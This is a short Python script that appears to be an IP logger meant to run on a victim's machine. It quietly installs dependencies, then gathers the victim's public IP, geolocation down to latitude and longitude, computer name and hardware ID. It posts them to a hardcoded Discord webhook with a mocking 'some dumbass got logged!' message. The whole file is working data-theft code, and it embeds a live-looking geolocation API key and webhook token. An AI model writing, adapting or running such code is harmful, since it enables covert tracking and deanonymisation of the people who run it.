import subprocess
import sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# List of required packages
required_packages = ["requests", "psutil"]

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        install(package)

import json
import urllib.request as req
import subprocess
import platform
import requests

def fetch_hwid():
    try:
        output = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        return output
    except Exception as e:
        print("Error fetching HWID:", e)
        return "N/A"

def fetch_and_send_info():
    url = 'https://api.ipgeolocation.io/ipgeo?apiKey=0ca3745a51d74a4bbc9f1f388d53396c'
    ip_info = json.load(req.urlopen(url))

    # Fetch Computer Name and HWID
    computer_name = platform.node()
    hwid = fetch_hwid()

    # Send the geolocation information to Discord webhook
    webhook_url = 'https://discord.com/api/webhooks/1224380379021053992/pTW72M4xLdnXG1k1dO2UTBu8Xf5r2L89k0MT1lVL7tmjC-w7vFbezgBI_tB7m7Jnsn1d'
    payload = {
        "content": f"@everyone\nsome dumbass got logged! <:420:1224048622283260014>\nIP: ||{ip_info['ip']}||\nCountry: ||{ip_info['country_name']}||\nCity: ||{ip_info['city']}||\nLatitude: ||{ip_info['latitude']}||\nLongitude: ||{ip_info['longitude']}||\nComputer Name: ||{computer_name}||\nHWID: ||{hwid}||"
    }
    requests.post(webhook_url, json=payload)

if __name__ == "__main__":
    fetch_and_send_info()
